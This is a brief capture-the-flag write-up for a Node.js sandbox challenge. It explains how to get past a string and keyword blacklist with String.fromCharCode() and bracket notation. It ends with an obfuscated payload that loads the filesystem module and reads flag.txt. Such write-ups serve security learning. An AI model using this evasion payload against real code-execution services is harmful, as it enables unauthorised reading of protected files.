# NodeJail
Author: Reyes  
**Difficulty: Medium**  

# Description
I made a nodejs console to run javascript as a service. Read flag.txt.

# Solution

Blacklist of string characters can be bypassed with `String.fromCharCode()`, while blacklisting the read function can be byppased with `[]` notation instead of `.` notation.

## Final Payload
```js
require(String.fromCharCode(110,111,100,101,58,102,115))[String.fromCharCode(114,101,97,100,70,105,108,101)](String.fromCharCode(46,47,102,108,97,103,46,116,120,116), String.fromCharCode(117,116,102,56), function(_, data){console.log(data)})
```
